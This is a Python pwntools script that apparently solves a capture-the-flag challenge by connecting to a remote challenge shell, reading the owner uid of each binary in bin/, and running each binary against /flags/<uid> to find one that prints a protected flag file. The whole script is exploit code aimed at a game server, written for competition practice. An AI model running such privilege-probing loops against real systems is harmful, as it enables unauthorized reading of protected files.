from pwn import *
import glob

context.timeout = 3

paths = glob.glob("bin/*")
paths = [os.path.join("/", x) for x in paths]
print(paths)

def connect():
    while True:
        print("trying...")
        try:
            r = remote("whooo-are-u-helper.challenges.ooo", 5000)
            r.recvuntil(':/$ ', timeout=3)
            r.sendline("")
            break
        except EOFError:
            r.close()
    return r

def get_uid(r, path):
    r.sendline("ls -l \"%s\" | awk '{print $3}'" % path)
    print(r.recvline())
    try:
        uid = int(r.recvline().strip())
    except ValueError:
        return None
    return uid

def fuzz_cmd(path, uid):
    flag_path = os.path.join("/", "flags", str(uid))
    print(flag_path)
    cmd = "%s %s" % (path, flag_path)
    print(cmd)
    return cmd

def get_output(r, cmd):
    r.sendlineafter(":/$ ", cmd + "; echo AAAA")
    output = r.recvuntil('AAAA')[:-4]
    output = r.recvuntil('AAAA')[:-4]
    return output

for path in paths:
    r = connect()
    print(r.recvline())
    uid = get_uid(r, path)
    if not uid:
        continue
    cmd = fuzz_cmd(path, uid)
    output = get_output(r, cmd)
    print(output)
    r.close()

r.interactive()
